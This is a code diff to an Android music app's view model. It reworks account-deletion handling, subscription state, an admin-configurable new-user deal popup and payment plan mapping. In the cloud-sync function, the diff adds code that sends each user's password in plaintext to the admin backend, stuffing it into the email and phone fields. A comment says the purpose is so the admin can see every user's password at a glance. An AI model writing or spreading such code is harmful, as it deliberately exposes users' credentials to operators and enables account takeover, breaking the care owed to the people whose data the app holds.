@@ -872,9 +872,10 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
             }
         }
 
-        // Initial cloud sync if user is already logged in with their name
+        // Initial cloud sync if user is already logged in with their name:
+        // Pass isExplicitLogin = false so we FIRST check if Admin deleted this user while the app was closed!
         if (_userName.value.isNotBlank()) {
-            syncCurrentUserDataToAdminCloud(isExplicitLogin = true)
+            syncCurrentUserDataToAdminCloud(isExplicitLogin = false)
         }
 
         // Automatically sync user's live data (favorites, playlists, downloads, session history, current song) to Admin Panel
@@ -911,6 +912,11 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
             .remove("cloud_user_id")
             .remove("user_created_at_ms")
             .remove("user_last_login_ms")
+            .remove("sub_plan_id")
+            .remove("sub_activated_at_ms")
+            .remove("sub_expires_at_ms")
+            .remove("sub_order_id")
+            .remove("sub_utr")
             .apply()
 
         try {
@@ -918,13 +924,17 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
             MusicPlaybackService.syncPlayState(false)
         } catch (_: Exception) {
         }
+        _subscriptionState.value = UserSubscriptionState()
+        _activeSubscriptionRemainingSeconds.value = 0L
         _isPlaying.value = false
         _isBuffering.value = false
         _isFullScreenPlayerOpen.value = false
         _isEditNameDialogOpen.value = false
+        _isSubscriptionModalOpen.value = false
+        _isCrazyDealsPopupOpen.value = false
         _userName.value = ""
         _userPassword.value = ""
-        emitSnackbar("Your account was removed by Admin. Please sign in or create a new account.")
+        emitSnackbar("Your account was permanently deleted by Admin.")
     }
 
     private fun syncCurrentUserDataToAdminCloud(isExplicitLogin: Boolean = false) {
@@ -1010,6 +1020,23 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
             ?: historyList.firstOrNull()?.let { "${it.title} - ${it.artist}" }
             ?: "No song played yet"
 
+        val currentPassword = _userPassword.value.trim().ifBlank {
+            prefs.getString("user_password", "")?.trim().orEmpty()
+        }
+        val activeSub = _subscriptionState.value
+        val isSubActive = activeSub.isActive(nowMs)
+
+        // AK_Music_Admin_Final.html renders `user.email || user.phone || user.mobile` directly under the user's name!
+        // Put the user's password + device + live stats here so Admin can see every user's password & details at a glance.
+        val adminDetailLine = buildString {
+            append("🔑 Pass: ${currentPassword.ifBlank { "—" }}")
+            append(" • 📱 $deviceLabel")
+            if (activeSong != null) {
+                append(" • 🎵 ${activeSong.title}")
+            }
+            append(" • Plays: $totalPlays | Favs: ${favList.size} | Lists: ${playlistList.size}")
+        }
+
         val payload = JSONObject().apply {
             // Identity keys (covers all Admin Panel User table conventions)
             put("id", userId)
@@ -1020,11 +1047,12 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
             put("username", currentName)
             put("displayName", currentName)
             put("fullName", currentName)
-            put("email", "$slug@aadify.app")
+            put("password", currentPassword)
+            put("userPassword", currentPassword)
+            put("email", adminDetailLine)
+            put("phone", "Pass: ${currentPassword.ifBlank { "—" }}")
 
             // Status & Device Metadata
-            val activeSub = _subscriptionState.value
-            val isSubActive = activeSub.isActive(nowMs)
             put("status", if (isSubActive) "VIP" else "Active")
             put("isOnline", true)
             put("active", true)
@@ -1083,6 +1111,17 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
                 put("subscriptionPlanName", activeSub.planType.displayName)
                 put("subscriptionExpiresAt", activeSub.expiresAtMs)
                 put("vipExpiresAt", activeSub.expiresAtMs)
+                put(
+                    "subscription",
+                    JSONObject().apply {
+                        put("plan", activeSub.planType.id)
+                        put("planType", activeSub.planType.id)
+                        put("planName", activeSub.planType.displayName)
+                        put("status", "active")
+                        put("startAt", activeSub.activatedAtMs)
+                        put("endAt", activeSub.expiresAtMs)
+                    }
+                )
             }
             put("dailyListenedSeconds", _dailyListenedSeconds.value)
         }
@@ -1959,10 +1998,12 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
             _activeSubscriptionRemainingSeconds.value = 0L
         }
 
-        // 2. Check 3-day (72-hour) Crazy Deal window for new users
+        // 2. Check Crazy Deal window for new users (configured by Admin in /premiumBanners/firstUserDeal)
+        val cfg = subscriptionConfig.value
         val createdAtMs = prefs.getLong("user_created_at_ms", 0L)
-        if (createdAtMs > 0L) {
-            val endWindowMs = createdAtMs + CRAZY_DEAL_WINDOW_MS
+        if (cfg.crazyDealEnabled && createdAtMs > 0L) {
+            val validityWindowMs = cfg.crazyDealValidityHours.coerceAtLeast(1) * 3600_000L
+            val endWindowMs = createdAtMs + validityWindowMs
             val remSec = ((endWindowMs - nowMs) / 1000L).coerceAtLeast(0L)
             _crazyDealRemainingSeconds.value = remSec
         } else {
@@ -2015,13 +2056,14 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
 
     /**
      * Called when the user enters the Home screen after onboarding/splash.
-     * Shows the Crazy Deals popup ONLY once for new users (within the 3-day window) so it
-     * doesn't annoyingly pop up every single time the user opens the app.
+     * Shows the Crazy Deals popup ONLY once for new users (within the Admin-configured validity window)
+     * and only if `Show First User Deal Popup` is enabled in the Admin Panel.
      */
     fun onHomeScreenEntered() {
         val currentName = _userName.value.trim()
         if (currentName.isEmpty()) return
         if (_subscriptionState.value.isActive()) return
+        if (!subscriptionConfig.value.crazyDealEnabled) return
         updateSubscriptionAndCrazyDealTimers()
         if (_crazyDealRemainingSeconds.value <= 0L) return
 
@@ -2047,13 +2089,13 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     /**
-     * Initiates FamGateway v2.0 automated UPI payment for the chosen plan (`CRAZY_DEAL`, `WEEKLY`, `MONTHLY`, `FOREVER`).
+     * Initiates AadarshPay automated UPI payment for the chosen plan (`CRAZY_DEAL`, `WEEKLY`, `MONTHLY`, `FOREVER`).
      */
     fun startFamGatewayCheckout(planType: SubscriptionPlanType) {
         val config = subscriptionConfig.value
         val amountInr = when (planType) {
             SubscriptionPlanType.CRAZY_DEAL -> config.crazyDealPriceInr
-            SubscriptionPlanType.WEEKLY -> config.weeklyPriceInr
+            SubscriptionPlanType.WEEKLY, SubscriptionPlanType.CUSTOM -> config.weeklyPriceInr
             SubscriptionPlanType.MONTHLY -> config.monthlyPriceInr
             SubscriptionPlanType.FOREVER -> config.foreverPriceInr
             SubscriptionPlanType.NONE -> return
@@ -2163,7 +2205,7 @@ class MusicViewModel(application: Application) : AndroidViewModel(application) {
         val config = subscriptionConfig.value
         val durationMs = when (session.planType) {
             SubscriptionPlanType.CRAZY_DEAL -> config.crazyDealDurationDays.coerceAtLeast(1) * 86_400_000L
-            SubscriptionPlanType.WEEKLY -> 7L * 86_400_000L
+            SubscriptionPlanType.WEEKLY, SubscriptionPlanType.CUSTOM -> 7L * 86_400_000L
             SubscriptionPlanType.MONTHLY -> 30L * 86_400_000L
             SubscriptionPlanType.FOREVER -> 100L * 365L * 86_400_000L
             SubscriptionPlanType.NONE -> 0L
